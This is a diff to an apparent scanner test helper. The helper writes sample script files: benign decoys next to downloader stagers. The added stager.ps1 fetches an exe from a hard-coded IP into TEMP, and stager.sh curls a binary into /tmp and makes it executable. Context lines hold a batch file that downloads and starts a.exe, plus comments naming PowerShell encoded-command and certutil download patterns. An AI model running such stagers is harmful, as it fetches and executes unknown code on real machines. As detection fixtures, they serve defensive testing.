@@ -233,6 +233,10 @@ def build_folder(root):
     w("benign.ps1", b"Write-Host 'hello game'\n")
     w("docs.ps1", b"# docs: runs webclient downloadstring then iex (powershell -enc pattern)\n"
                    b"# see also: certutil -urlcache notes\nWrite-Host 'done'\n")
+    w("stager.ps1", b"$w = New-Object Net.WebClient\n"
+                     b"$w.DownloadFile('http://16.16.16.16/a.exe', $env:TEMP + '\\a.exe')\n"
+                     b"Set-Content ($env:TEMP + '\\a.exe') $x\n")
+    w("stager.sh", b"curl -fsSL http://17.17.17.17/b -o /tmp/b\nchmod +x /tmp/b\n")
     w("launch.bat", b"@echo off\r\nstart readme.lnk\r\n")
     w("docs.bat", b"@echo off\r\nREM powershell -enc AAAA hidden dropper notes\r\necho ok\r\n")
     w("dl.bat", ("@echo off\r\n%s %%TEMP%%\\a.exe\r\nstart %%TEMP%%\\a.exe\r\n" % _DL_CMD).encode())
